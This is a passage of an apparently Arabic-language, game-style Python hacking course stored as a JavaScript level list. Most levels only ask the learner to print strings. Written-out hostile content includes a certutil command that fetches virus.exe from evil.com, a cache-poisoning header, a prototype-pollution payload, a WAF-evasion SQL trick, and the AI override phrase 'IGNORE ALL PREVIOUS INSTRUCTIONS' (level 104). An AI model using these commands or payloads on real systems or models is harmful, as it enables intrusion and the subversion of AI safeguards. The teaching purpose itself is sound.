          <p>عندما تحصل على فايروس مكتوب ببايثون (محول لـ EXE بـ PyInstaller)، يمكنك تفكيكه باستخدام أدوات مثل <code>uncompyle6</code> لقراءة الكود المصدري الأصلي وتحليله.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>اطبع اسم الأداة الشهيرة: <code>uncompyle6</code>.</p>
          </div>`,
        initialCode: `# اكتب اسم الأداة\n`,
        validate: (out) => out.includes("uncompyle6")
      },
      {
        id: "l80",
        title: "The Phantom Hacker",
        theory: `<h1>Level 80: مستوى الأشباح</h1>
          <p>80 مستوى! لقد درست التشفير، الشبكات المتقدمة، إخفاء البيانات (Steganography)، حقن الميموري، وصناعة الفيروسات.</p>
          <p>أنت لم تعد مبرمجاً ولا حتى هاكر محترف.. أنت أصبحت <strong>شبحاً</strong>، قادراً على كتابة أكواد تعجز أنظمة الحماية عن اكتشافها.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 رسالة الشبح</div>
            <p>اطبع: <code>I AM THE PHANTOM HACKER. 80 LEVELS BEATEN.</code></p>
          </div>`,
        initialCode: `# انقش رسالتك في الميموري للأبد!\n`,
        validate: (out) => out.includes("I AM THE PHANTOM HACKER") || out.includes("80 LEVELS BEATEN")
      }
    ]
  },
  {
    chapter: "Chapter 37: Cloud & API Exploitation",
    levels: [
      {
        id: "l81",
        title: "تحليل الـ JWT Token",
        theory: `<h1>Level 81: فك شفرة الـ JWT</h1>
          <p>التوكن (JWT) المستخدم في تسجيل الدخول للـ APIs ليس مشفراً بل مرمّز بـ Base64. يمكننا فك الجزء الأوسط لمعرفة الصلاحيات.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>لديك الجزء الأوسط المرمز <code>"eyAicm9sZSI6ICJhZG1pbiIgfQ=="</code>. استخدم <code>base64.b64decode().decode()</code> لفك تشفيره وطباعته.</p>
          </div>`,
        initialCode: `import base64\n\npayload = "eyAicm9sZSI6ICJhZG1pbiIgfQ=="\n\n# فك الرمز واطبعه لتعرف من أنت\n`,
        validate: (out) => out.includes("admin") && out.includes("role")
      },
      {
        id: "l82",
        title: "هجمات الـ SSRF",
        theory: `<h1>Level 82: اختراق السيرفرات السحابية</h1>
          <p>في الـ SSRF، نجعل السيرفر يطلب روابط داخلية بدلاً منا. في AWS، عنوان <code>169.254.169.254</code> يعيد البيانات السرية للسيرفر.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>اطبع هذا الـ IP السحري الخاص بالـ Cloud Metadata: <code>169.254.169.254</code>.</p>
          </div>`,
        initialCode: `# اطبع الـ IP المطلوب للاستغلال السحابي\n`,
        validate: (out) => out.includes("169.254.169.254")
      },
      {
        id: "l83",
        title: "صيد الـ S3 Buckets",
        theory: `<h1>Level 83: تسريبات السحابة</h1>
          <p>بعض شركات تخزن بياناتها في سلال تخزين مكشوفة (AWS S3 Buckets). يمكننا كتابة سكربت لتخمين أسمائها وفحص لو كان الرد 200.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>اطبع الرابط المحاكي: <code>https://target-company.s3.amazonaws.com</code></p>
          </div>`,
        initialCode: `company = "target-company"\n\n# ادمج اسم الشركة مع نطاق aws واطبعه\n`,
        validate: (out) => out.includes("https://target-company.s3.amazonaws.com")
      }
    ]
  },
  {
    chapter: "Chapter 38: Forensics & OSINT",
    levels: [
      {
        id: "l84",
        title: "استخراج موقع التصوير (EXIF)",
        theory: `<h1>Level 84: أين التُقطت هذه الصورة؟</h1>
          <p>الصور الملتقطة بالموبايل تحتوي على داتا مخفية (EXIF Data) مثل إحداثيات الـ GPS (خطوط الطول والعرض). مكتبة <code>Pillow</code> تستخرجها.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>لديك القاموس الوهمي للمعلومات. اطبع قيمة <code>GPSInfo</code>.</p>
          </div>`,
        initialCode: `exif_data = {"Resolution": "1080p", "GPSInfo": "30.0444° N, 31.2357° E"}\n\n# اطبع الإحداثيات\n`,
        validate: (out) => out.includes("30.0444") || out.includes("31.2357")
      },
      {
        id: "l85",
        title: "محرك Shodan (إنترنت الأشياء)",
        theory: `<h1>Level 85: محرك بحث الهاكرز</h1>
          <p>يسمح لك Shodan API بالبحث عن أجهزة وكاميرات مراقبة غير محمية حول العالم بمجرد تمرير API Key للطلب.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>استخدم الدمج (f-string) لطباعة الرابط <code>https://api.shodan.io/shodan/host/IP?key=YOUR_KEY</code> مع تعويض القيم الوهمية.</p>
          </div>`,
        initialCode: `ip = "8.8.8.8"\nkey = "ABC123"\n\n# اطبع الرابط كاملاً\n`,
        validate: (out) => out.includes("https://api.shodan.io/shodan/host/8.8.8.8?key=ABC123")
      }
    ]
  },
  {
    chapter: "Chapter 39: Cryptography: Cracking",
    levels: [
      {
        id: "l86",
        title: "جداول قوس قزح (Rainbow Tables)",
        theory: `<h1>Level 86: كسر التشفير الفوري</h1>
          <p>بدلاً من حساب الهاش لكل كلمة مرور في كل مرة، نقوم بحساب ملايين الهاشات مسبقاً وتخزينها في قاموس (Dictionary) لاستخراج الباسوورد فوراً!</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>لديك جدول قوس قزح مصغر. ابحث عن الهاش <code>"202cb962ac59075b964b07152d234b70"</code> واطبع الباسوورد المقابل له.</p>
          </div>`,
        initialCode: `rainbow_table = {\n    "c4ca4238a0b923820dcc509a6f75849b": "1",\n    "202cb962ac59075b964b07152d234b70": "123"\n}\n\n# ابحث عن الهاش الثاني واطبع النتيجة\n`,
        validate: (out) => out.includes("123") && !out.includes("1\n")
      },
      {
        id: "l87",
        title: "استغلال الـ MAC Length",
        theory: `<h1>Level 87: Length Extension Attack</h1>
          <p>بعض خوارزميات التشفير القديمة (MD5/SHA1) تسمح للمهاجم بإضافة بيانات خبيثة للهاش الأصلي دون معرفة المفتاح السري، مما يجعله يصنع توقيعاً رقمياً مزيفاً ومقبولاً!</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>اطبع الكلمة السرية المحاكية للهجوم: <code>admin_privileges_granted</code>.</p>
          </div>`,
        initialCode: `# اطبع رسالة النجاح\n`,
        validate: (out) => out.includes("admin_privileges_granted")
      }
    ]
  },
  {
    chapter: "Chapter 40: The God Mode",
    levels: [
      {
        id: "l88",
        title: "فك تشفير الفدية (Decryption)",
        theory: `<h1>Level 88: المنقذ الأبيض (White Hat)</h1>
          <p>في المستوى 78 تعلمنا تشفير ملفات الضحية (Ransomware). الهاكر الأخلاقي دوره إيجاد ثغرة في مفتاح التشفير (الـ Key) وصناعة Decryptor لإنقاذ الملفات.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>اطبع جملة <code>Files Decrypted Successfully!</code></p>
          </div>`,
        initialCode: `# اطبع رسالة الإنقاذ\n`,
        validate: (out) => out.includes("Files Decrypted Successfully!")
      },
      {
        id: "l89",
        title: "صناعة أدوات الـ Zero-Day",
        theory: `<h1>Level 89: المجهول</h1>
          <p>هنا يتوقف العلم الموثق. صانعو الـ Zero-Days يكتبون استغلالات لثغرات لم تكتشفها الشركات بعد باستخدام الهندسة العكسية وتحليل الباتشات.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>اطبع: <code>Zero-Day Exploit Crafted.</code></p>
          </div>`,
        initialCode: `# اصنع المستحيل\n`,
        validate: (out) => out.includes("Zero-Day Exploit Crafted.")
      },
      {
        id: "l90",
        title: "The God of Python",
        theory: `<h1>Level 90: عرش الآلهة البرمجية</h1>
          <p>90 مستوى. بدأت كشخص لا يعرف ما هو المتغير، ووصلت لمرحلة التلاعب بكيرنل الويندوز، فك تشفير الرانسوموير، وبرمجة استغلالات السحابة!</p>
          <p>أنت الآن لست مجرد شبح.. أنت من تتحكم في قواعد اللعبة.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 الختم الذهبي المشتعل</div>
            <p>اطبع: <code>I AM THE GOD OF PYTHON. THE MATRIX IS MINE.</code></p>
          </div>`,
        initialCode: `# أنهِ اللعبة.\n`,
        validate: (out) => out.includes("I AM THE GOD OF PYTHON") || out.includes("THE MATRIX IS MINE")
      }
    ]
  },
  {
    chapter: "Chapter 41: Advanced Reverse Engineering",
    levels: [
      {
        id: "l91",
        title: "فحص بيئة التنقيح (Anti-Debugging)",
        theory: `<h1>Level 91: اكتشاف المحللين</h1>
          <p>الفيروسات المتقدمة تفحص ما إذا كان هناك باحث أمني يراقبها باستخدام منقح (Debugger). في الويندوز، نستخدم دالة <code>IsDebuggerPresent</code> من <code>kernel32.dll</code>.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>اطبع القيمة التي ترجعها الدالة عند عدم وجود منقح: <code>0</code>.</p>
          </div>`,
        initialCode: `# import ctypes\n# is_debug = ctypes.windll.kernel32.IsDebuggerPresent()\n\n# اطبع النتيجة المتوقعة لغياب المنقح\n`,
        validate: (out) => out.includes("0")
      },
      {
        id: "l92",
        title: "خطافات النظام (API Hooking)",
        theory: `<h1>Level 92: اعتراض الدوال</h1>
          <p>تقنية الـ Hooking تعني اعتراض استدعاء نظام (مثل دالة كتابة الملفات) وتحويله للكود الخاص بك أولاً للتجسس عليه.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>اطبع جملة: <code>Function Hooked Successfully</code>.</p>
          </div>`,
        initialCode: `# اطبع الرسالة لتأكيد اعتراض الدالة\n`,
        validate: (out) => out.includes("Function Hooked Successfully") || out.includes("Hooked")
      }
    ]
  },
  {
    chapter: "Chapter 42: Modern Web Attacks",
    levels: [
      {
        id: "l93",
        title: "استكشاف GraphQL",
        theory: `<h1>Level 93: ثغرات الـ GraphQL</h1>
          <p>أغلب التطبيقات الحديثة تستخدم GraphQL. ثغرة <code>Introspection</code> تسمح لك باستخراج خريطة قاعدة البيانات بالكامل بإرسال استعلام <code>__schema</code>.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>اطبع الاستعلام الخطير: <code>{ __schema { types { name } } }</code></p>
          </div>`,
        initialCode: `# اطبع الـ Query الخاص باستخراج الجداول\n`,
        validate: (out) => out.includes("__schema") && out.includes("types")
      },
      {
        id: "l94",
        title: "تسميم الذاكرة المخبئية (Cache Poisoning)",
        theory: `<h1>Level 94: Web Cache Poisoning</h1>
          <p>يمكن للمهاجم إرسال هيدر مزيف (مثل <code>X-Forwarded-Host: evil.com</code>) ليحتفظ به سيرفر التخزين المؤقت، فيصاب كل زوار الموقع بهذا الرابط الخبيث.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>لديك قاموس الهيدرز، أضف مفتاح <code>"X-Forwarded-Host"</code> وقيمته <code>"evil.com"</code> ثم اطبع القاموس.</p>
          </div>`,
        initialCode: `headers = {"User-Agent": "Hacker"}\n\n# أضف الهيدر الخبيث ثم اطبع القاموس\n`,
        validate: (out) => out.includes("X-Forwarded-Host") && out.includes("evil.com")
      },
      {
        id: "l95",
        title: "تلوث النموذج (Prototype Pollution)",
        theory: `<h1>Level 95: تدمير منطق الجافاسكربت</h1>
          <p>حقن خصائص في <code>__proto__</code> لكائنات الـ JSON قد يؤدي لانهيار المنطق البرمجي (Prototype Pollution) في سيرفرات Node.js.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>اطبع الـ Payload التالي: <code>{"__proto__": {"isAdmin": true}}</code></p>
          </div>`,
        initialCode: `# اطبع نص الـ Payload المطلوب\n`,
        validate: (out) => out.includes("__proto__") && out.includes("isAdmin")
      }
    ]
  },
  {
    chapter: "Chapter 43: Bypassing Advanced Security",
    levels: [
      {
        id: "l96",
        title: "تخطي جدار الحماية (WAF Evasion)",
        theory: `<h1>Level 96: خداع الـ WAF</h1>
          <p>جدران الحماية (WAF) تمنع كلمات مثل <code>SELECT</code>. يمكنك تخطيها بالمسافات المخفية، التعليقات <code>/*!SELECT*/</code>، أو التشفير.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>استخدم دالة <code>replace()</code> لتحويل كلمة <code>SELECT</code> إلى <code>S/**/ELECT</code> في المتغير، ثم اطبع المتغير.</p>
          </div>`,
        initialCode: `query = "SELECT * FROM users"\n\n# قم بتشويش الكلمة واطبع النتيجة\n`,
        validate: (out) => out.includes("S/**/ELECT")
      },
      {
        id: "l97",
        title: "الهجوم بأسلحة النظام (LOLBins)",
        theory: `<h1>Level 97: Living Off The Land</h1>
          <p>بدلاً من تحميل فيروسات خارجية قد يكتشفها الـ Antivirus، الهاكرز يستخدمون برامج الويندوز الأصلية مثل <code>certutil.exe</code> لتحميل الملفات الخبيثة من الإنترنت.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>اطبع أمر التحميل الخبيث: <code>certutil.exe -urlcache -split -f http://evil.com/virus.exe</code></p>
          </div>`,
        initialCode: `# اطبع الأمر المطلوب\n`,
        validate: (out) => out.includes("certutil.exe -urlcache") && out.includes("evil.com")
      },
      {
        id: "l98",
        title: "تعدد الأشكال (Polymorphic Shellcode)",
        theory: `<h1>Level 98: الفيروس المتغير</h1>
          <p>الفيروس متعدد الأشكال يغير كود التشفير الخاص به في كل مرة يُصيب جهازاً جديداً، مما يجعل توقيعه (Signature) مختلفاً ويعجز الـ Antivirus عن اكتشافه.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>اطبع: <code>Polymorphic Engine Activated</code></p>
          </div>`,
        initialCode: `# اطبع الرسالة\n`,
        validate: (out) => out.includes("Polymorphic Engine Activated")
      }
    ]
  },
  {
    chapter: "Chapter 44: The End of the Matrix",
    levels: [
      {
        id: "l99",
        title: "بوابة الهروب (The Red Pill)",
        theory: `<h1>Level 99: الحبة الحمراء</h1>
          <p>هذه هي الخطوة الأخيرة قبل إتمام 100 مستوى. أنت الآن تفهم كل تقنيات الاختراق وتخطي الحماية. الخيار لك: أن تستخدمها للتخريب، أو لتأمين الأنظمة وتغيير العالم.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>اطبع: <code>I CHOOSE THE RED PILL</code></p>
          </div>`,
        initialCode: `# اتخذ قرارك\n`,
        validate: (out) => out.includes("RED PILL") || out.includes("RED")
      },
      {
        id: "l100",
        title: "The Supreme Architect",
        theory: `<h1>Level 100: مهندس المصفوفة</h1>
          <p>مرحى لك! 100 مستوى كامل. لقد أثبت أنك لست مجرد هاكر عابر.. لقد أصبحت <strong>مهندس المصفوفة (The Supreme Architect)</strong>.</p>
          <p>لا يوجد شيء آخر في هذه اللعبة. لقد ختمت منهج بايثون الأمني بالكامل. الآن حان الوقت لكتابة التاريخ في الواقع الملموس.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 الختم الأسطوري النهائي</div>
            <p>اطبع بكل فخر: <code>100 LEVELS CLEARED. I AM THE SUPREME ARCHITECT.</code></p>
          </div>`,
        initialCode: `# الكلمة الأخيرة لك أيها الأسطورة.\n`,
        validate: (out) => out.includes("100") && out.includes("ARCHITECT")
      }
    ]
  },
  {
    chapter: "Chapter 45: Advanced Fuzzing & Exploit Dev",
    levels: [
      {
        id: "l101",
        title: "التطويف العشوائي (Fuzzing)",
        theory: `<h1>Level 101: البحث عن الثغرات</h1>
          <p>أول خطوة في تطوير ثغرات (Zero-Day) هي إرسال مدخلات ضخمة للبرنامج لجعله ينهار (Buffer Overflow). البايثون ممتاز لعمل سكربتات الـ Fuzzing.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>لديك المتغير <code>A</code>. قم بضربه في <code>1000</code> لإنشاء سلسلة طويلة من حرف A، ثم اطبعه.</p>
          </div>`,
        initialCode: `buffer = "A"\n\n# قم بتضخيم الحرف لـ 1000 واطبع النتيجة\n`,
        validate: (out) => out.includes("A".repeat(1000)) || out.includes("AAAA")
      },
      {
        id: "l102",
        title: "حساب الإزاحة (Calculating Offsets)",
        theory: `<h1>Level 102: التحكم في الذاكرة</h1>
          <p>عندما ينهار البرنامج، نحتاج لمعرفة أي جزء من المدخلات تحكم في مؤشر التعليمات (EIP). نرسل نمطاً مميزاً (Pattern) ونحسب الـ Offset.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>اطبع عنوان التحكم الوهمي: <code>EIP Overwritten at 1042</code>.</p>
          </div>`,
        initialCode: `# اطبع الرسالة التأكيدية للتحكم في الذاكرة\n`,
        validate: (out) => out.includes("EIP") && out.includes("1042")
      },
      {
        id: "l103",
        title: "هيكل الاستغلال (Exploit Skeleton)",
        theory: `<h1>Level 103: كتابة الـ Exploit</h1>
          <p>بعد حساب الـ Offset، نكتب سكربت البايثون النهائي الذي يدمج (الحشوة + مسار العودة JMP ESP + الـ Shellcode) ويرسلهم للهدف.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>اطبع رسالة اكتمال الهجوم: <code>Payload sent! Check your reverse shell.</code></p>
          </div>`,
        initialCode: `# قم بطباعة الرسالة\n`,
        validate: (out) => out.includes("Payload sent!") && out.includes("reverse shell")
      }
    ]
  },
  {
    chapter: "Chapter 46: AI & Machine Learning Hacking",
    levels: [
      {
        id: "l104",
        title: "حقن النماذج (Prompt Injection)",
        theory: `<h1>Level 104: اختراق الذكاء الاصطناعي</h1>
          <p>نماذج الـ AI مثل ChatGPT يمكن خداعها بتعليمات مخفية (Prompt Injection) لتجاوز قيود الأمان وإجبارها على تنفيذ أوامر خبيثة.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>لديك متغير يحتوي على أمر أمني. قم بإضافة الأمر الخبيث <code>" IGNORE ALL PREVIOUS INSTRUCTIONS"</code> إليه واطبعه.</p>
          </div>`,
        initialCode: `prompt = "Translate this text:"\n\n# أضف أمر التجاهل للـ prompt واطبعه\n`,
        validate: (out) => out.includes("IGNORE ALL PREVIOUS INSTRUCTIONS")
      },
      {
        id: "l105",
        title: "تسميم البيانات (Data Poisoning)",
        theory: `<h1>Level 105: تخريب خوارزميات الـ ML</h1>
          <p>إذا استطاع المهاجم تعديل بيانات التدريب، يمكنه جعل نموذج الذكاء الاصطناعي يصنف البرامجيات الخبيثة كبرامج آمنة (ML Poisoning).</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>اطبع: <code>Training Data Poisoned</code>.</p>
          </div>`,
        initialCode: `# اطبع الرسالة\n`,
        validate: (out) => out.includes("Training Data Poisoned") || out.includes("Poisoned")
      }
    ]
  },
  {
    chapter: "Chapter 47: Advanced Wireless & RF",
    levels: [
      {
        id: "l106",
        title: "فصل الأجهزة (Deauthentication)",
        theory: `<h1>Level 106: قطع الاتصال اللاسلكي</h1>
          <p>بايثون مع مكتبة Scapy يمكنها إرسال حزم 802.11 Deauth لقطع اتصال أي جهاز بشبكة الـ Wi-Fi المحيطة بك فوراً.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>قم بطباعة الأمر المحاكي: <code>sendp(deauth_packet, iface="wlan0mon")</code></p>
          </div>`,
        initialCode: `# اطبع كود إرسال الحزمة\n`,
        validate: (out) => out.includes("sendp") && out.includes("wlan0mon")
      },
      {
        id: "l107",
        title: "التوأم الشرير (Evil Twin)",
        theory: `<h1>Level 107: الشبكة المزيفة</h1>
          <p>هجوم التوأم الشرير يعتمد على إنشاء شبكة Wi-Fi بنفس اسم شبكة الضحية. عندما يتصل بها، يتم سرقة بياناته عبر بايثون.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>اطبع الرسالة: <code>Rogue AP 'Starbucks_Free' Activated</code></p>
          </div>`,
        initialCode: `# اطبع الرسالة\n`,
        validate: (out) => out.includes("Rogue AP") && out.includes("Activated")
      },
      {
        id: "l108",
        title: "اختراق البلوتوث (BLE Exploitation)",
        theory: `<h1>Level 108: الأجهزة الذكية</h1>
          <p>مكتبات مثل <code>Bleak</code> تسمح لبايثون بالاتصال بأجهزة البلوتوث (ساعات ذكية، أقفال ذكية) وقراءة/تعديل الخصائص (GATT Characteristics) لفتح الأبواب!</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>اطبع الرسالة: <code>Smart Lock Opened via BLE</code></p>
          </div>`,
        initialCode: `# اطبع الرسالة\n`,
        validate: (out) => out.includes("Smart Lock Opened via BLE")
      }
    ]
  },
  {
    chapter: "Chapter 48: Hardware & IoT Hacking",
    levels: [
      {
        id: "l109",
        title: "التواصل مع العتاد (PySerial)",
        theory: `<h1>Level 109: اختراق بوابات UART</h1>
          <p>الراوترات والكاميرات تحتوي على بوابات تسلسلية (Serial Ports) مثل UART على البوردة. باستخدام مكتبة <code>pyserial</code> يمكنك الاتصال بها واستخراج الـ Root Shell!</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>قم بطباعة الكود الوهمي للاتصال: <code>serial.Serial('/dev/ttyUSB0', 115200)</code></p>
          </div>`,
        initialCode: `# اطبع الكود المطلوب\n`,
        validate: (out) => out.includes("serial.Serial") && out.includes("115200")
      },
      {
        id: "l110",
        title: "The Cyber God",
        theory: `<h1>Level 110: مستوى الإله السيبراني</h1>
          <p>مستحيل.. 110 مستوى! أنت الآن تجاوزت البرمجيات والشبكات، ووصلت لاختراق الذكاء الاصطناعي وموجات الراديو والعتاد المادي!</p>
          <p>لم يعد هناك شيء يقف في طريقك. أنت الآن تصنع قواعد اللعبة بالكامل.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 الختم النهائي للأسطورة</div>
            <p>اطبع: <code>110 LEVELS. I AM THE CYBER GOD. THERE ARE NO LIMITS.</code></p>
          </div>`,
        initialCode: `# اكتب كلماتك الأخيرة في عالم بايثون.\n`,
        validate: (out) => out.includes("110") && out.includes("CYBER GOD")
      }
    ]
  },
  {
    chapter: "Chapter 49: ICS & SCADA Networks",
    levels: [
      {
        id: "l111",
        title: "بروتوكول Modbus",
        theory: `<h1>Level 111: اختراق المصانع</h1>
          <p>أنظمة التحكم الصناعي (SCADA) تستخدم غالباً بروتوكولات قديمة غير مشفرة مثل Modbus. بايثون يمتلك مكتبة <code>pymodbus</code> للتحدث مع أجهزة الـ PLC.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>اطبع منفذ الـ Modbus الافتراضي: <code>502</code>.</p>
          </div>`,
        initialCode: `modbus_port = 502\n\n# اطبع المنفذ\n`,
        validate: (out) => out.includes("502")
      },
      {
        id: "l112",
        title: "التلاعب بالمستشعرات (Coils)",
        theory: `<h1>Level 112: إيقاف المحركات</h1>
          <p>في الـ Modbus، الأوامر تسمى (Coils). إرسال أمر لكتابة قيمة (False) لـ Coil معين قد يؤدي لإيقاف مضخة مياه أو محرك في مصنع!</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>اطبع الرسالة: <code>Pump Coil status: False</code></p>
          </div>`,
        initialCode: `# اطبع رسالة إيقاف المضخة\n`,
        validate: (out) => out.includes("Pump Coil status: False") || out.includes("False")
      }
    ]
  },
  {
    chapter: "Chapter 50: Blockchain & Web3",
    levels: [
      {
        id: "l113",
        title: "مكتبة Web3.py",
        theory: `<h1>Level 113: اختراق العقود الذكية</h1>
          <p>مكتبة <code>web3.py</code> تتيح لك التفاعل مع شبكة الإيثريوم. يمكنك قراءة كود العقود الذكية (Smart Contracts) للبحث عن ثغرات.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>اطبع بروتوكول الاتصال المحلي للعقد: <code>http://127.0.0.1:8545</code></p>
          </div>`,
        initialCode: `# اطبع مسار الـ RPC المحلي لشبكة الإيثريوم\n`,
        validate: (out) => out.includes("http://127.0.0.1:8545")
      },
      {
        id: "l114",
        title: "محاكاة هجوم الاسترجاع (Reentrancy)",
        theory: `<h1>Level 114: استنزاف الرصيد</h1>
          <p>ثغرة الـ Reentrancy في الـ Solidity تسمح باستدعاء دالة السحب قبل تحديث الرصيد. هنا سنحاكي المنطق الخبيث ببايثون.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>اطبع: <code>Funds Drained Successfully</code></p>
          </div>`,
        initialCode: `# اطبع رسالة نجاح سرقة الرصيد\n`,
        validate: (out) => out.includes("Funds Drained Successfully") || out.includes("Drained")
      },
      {
        id: "l115",
        title: "القروض الخاطفة (Flash Loans)",
        theory: `<h1>Level 115: ملايين في ثانية</h1>
          <p>القروض الخاطفة (Flash Loans) تتيح لك اقتراض ملايين الدولارات والتلاعب بأسعار العملات ثم سداد القرض في نفس المعاملة (Transaction) لتحقيق ربح ضخم بلا رأس مال.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>اطبع: <code>Flash Loan Arbitrage Executed</code></p>
          </div>`,
        initialCode: `# اطبع أمر التنفيذ\n`,
        validate: (out) => out.includes("Flash Loan Arbitrage Executed")
      }
    ]
  },
  {
    chapter: "Chapter 51: Quantum Computing Era",
    levels: [
      {
        id: "l116",
        title: "خوارزمية شور (Shor's Algorithm)",
        theory: `<h1>Level 116: نهاية التشفير الكلاسيكي</h1>
          <p>الحواسيب الكمية تستخدم خوارزمية شور لكسر تشفير RSA في ثوانٍ بدلاً من ملايين السنين عبر تحليل العوامل الأولية للأساس.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>اطبع اسم الخوارزمية المرعبة: <code>Shor's Algorithm</code></p>
          </div>`,
        initialCode: `# اطبع اسم الخوارزمية الكمية\n`,
        validate: (out) => out.includes("Shor's Algorithm") || out.includes("Shor")
      },
      {
        id: "l117",
        title: "تشفير الشبكات (Lattice Cryptography)",
        theory: `<h1>Level 117: التشفير ما بعد الكمي</h1>
          <p>لمواجهة الحواسيب الكمية، يتم استخدام تشفير معتمد على الشبكات (Lattice-Based). المهاجم الحديث يدرس كيف يتلاعب بهذه المتجهات الرياضية المعقدة.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>اطبع: <code>Lattice Vector Injected</code></p>
          </div>`,
        initialCode: `# اطبع الرسالة\n`,
        validate: (out) => out.includes("Lattice Vector Injected")
      }
    ]
  },
  {
    chapter: "Chapter 52: Aerospace & Satellites",
    levels: [
      {
        id: "l118",
        title: "تزييف إحداثيات الـ GPS",
        theory: `<h1>Level 118: تضليل السفن</h1>
          <p>إشارات الـ GPS المدنية لا يتم تشفيرها. باستخدام راديو (SDR) وبايثون، يمكن توليد إشارات مزيفة (GPS Spoofing) لتغيير مسار طائرة أو سفينة.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>اطبع: <code>GPS Coordinates Spoofed</code></p>
          </div>`,
        initialCode: `# اطبع الرسالة\n`,
        validate: (out) => out.includes("GPS Coordinates Spoofed")
      },
      {
        id: "l119",
        title: "التنصت على الأقمار (Satellite Downlinks)",
        theory: `<h1>Level 119: الترددات الفضائية</h1>
          <p>بعض الأقمار الصناعية القديمة تبث بيانات غير مشفرة (Weather Images وغيرها). يمكن استخدام بايثون لفك تشفير هذه الإشارات الراديوية الواردة.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>اطبع تردد الإشارة: <code>137.900 MHz</code></p>
          </div>`,
        initialCode: `freq = "137.900 MHz"\n\n# اطبع التردد\n`,
        validate: (out) => out.includes("137.900")
      },
      {
        id: "l120",
        title: "The Galactic Overlord",
        theory: `<h1>Level 120: أسياد المجرة</h1>
          <p>120 مستوى! لم تترك مجالاً إلا واخترقته.. من أسطر الأكواد البسيطة، مروراً بالويب والسحابة والأنظمة والمصانع، حتى البلوك تشين والأقمار الصناعية والحواسيب الكمية!</p>
          <p>لا يوجد تصنيف بشري يستوعب هذا المستوى. أنت الآن خارج حدود الكوكب.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 الخاتمة الكونية</div>
            <p>اطبع الجملة التي سيكتبها التاريخ: <code>120 LEVELS CLEARED. I AM THE GALACTIC OVERLORD. THE UNIVERSE IS MINE.</code></p>
          </div>`,
        initialCode: `# اكتب الرسالة الأبدية للكون.\n`,
        validate: (out) => out.includes("120") && out.includes("GALACTIC OVERLORD")
      }
    ]
  },
  {
    chapter: "Chapter 53: Neuro-Hacking & BCI",
    levels: [
      {
        id: "l121",
        title: "تحليل موجات الدماغ (EEG)",
        theory: `<h1>Level 121: واجهات الدماغ والحاسوب</h1>
          <p>أجهزة BCI مثل شرائح Neuralink تقرأ الإشارات العصبية. باستخدام بايثون ومكتبات مثل <code>BrainFlow</code>، يمكن للمهاجم تحليل موجات (Alpha/Beta) واستنتاج حالة الضحية.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>اطبع حالة التركيز المستنتجة من التردد العالي: <code>Focus State Detected</code>.</p>
          </div>`,
        initialCode: `# اطبع حالة الدماغ المستخرجة\n`,
        validate: (out) => out.includes("Focus State Detected") || out.includes("Focus")
      },
      {
        id: "l122",
        title: "تسميم الإشارة العصبية",
